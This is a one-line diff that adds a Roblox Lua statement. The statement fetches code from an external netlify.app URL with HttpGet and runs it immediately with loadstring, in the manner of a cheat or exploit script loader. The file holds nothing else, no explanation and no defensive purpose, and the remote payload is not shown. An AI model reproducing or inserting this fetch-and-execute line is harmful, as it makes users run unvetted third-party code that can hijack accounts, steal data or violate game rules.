@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://lunzobf.netlify.app/api/raw/8a33c0b9-3339-4153-ae46-d0b086a070ad"))()
